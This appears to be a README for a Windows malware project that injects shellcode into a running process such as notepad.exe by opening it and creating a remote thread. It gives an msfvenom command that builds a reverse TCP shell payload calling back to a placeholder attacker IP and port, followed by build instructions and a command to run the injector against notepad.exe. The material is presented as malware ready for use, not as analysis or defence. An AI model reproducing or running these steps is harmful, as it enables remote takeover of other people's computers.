# Shellcode Injection
Our goal with this malware is to find a process that is running, for example let's say notepad.exe, open it and create a thread that will host our shellcode

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<listen_port> -f c -b "\x00" -e EXITFUNC=thread -v shellcode
```

## Use
Launch the x64 Native Tools Command Prompt for VS console and navigate to the directory. The Makefile is made with cl in mind. you could change it to use gcc if you rather install that instead.

In the root directory run `make` (you have to install it someway in your windows machine) and the binary will be created in the bin folder.
```cmd
make
```

Then you can execeute it from which ever terminal you wish
```cmd
bin/shellcode.exe notepad.exe
```
